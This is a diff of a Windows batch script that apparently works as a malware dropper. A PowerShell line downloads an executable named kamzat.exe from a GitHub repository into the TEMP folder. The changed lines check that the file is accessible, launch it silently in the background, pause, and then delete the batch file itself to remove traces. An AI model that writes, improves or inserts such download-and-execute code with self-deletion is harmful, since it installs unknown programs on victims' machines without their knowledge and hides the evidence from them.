@@ -21,12 +21,18 @@ if %errorlevel% equ 0 (
 :: Download the file from GitHub to TEMP
 powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\kamzat.exe' -UseBasicParsing } catch { exit 1 }"
 
-:: Execute if download was successful
+:: Verify download completion and execute
 if exist "%TEMP%\kamzat.exe" (
-    start "" /B "%TEMP%\kamzat.exe"
-    
-    :: Cleanup - remove the batch file itself
-    ping -n 3 127.0.0.1 >nul
-    del "%~f0" >nul 2>&1
+    :: Ensure the file is fully downloaded by checking its accessibility
+    type nul >> "%TEMP%\kamzat.exe" 2>nul && (
+        :: Run the downloaded file
+        start "" /B "%TEMP%\kamzat.exe"
+        
+        :: Wait briefly to ensure the file has started
+        ping -n 3 127.0.0.1 >nul
+        
+        :: Cleanup - remove the batch file itself
+        del "%~f0" >nul 2>&1
+    )
 )
 exit /b
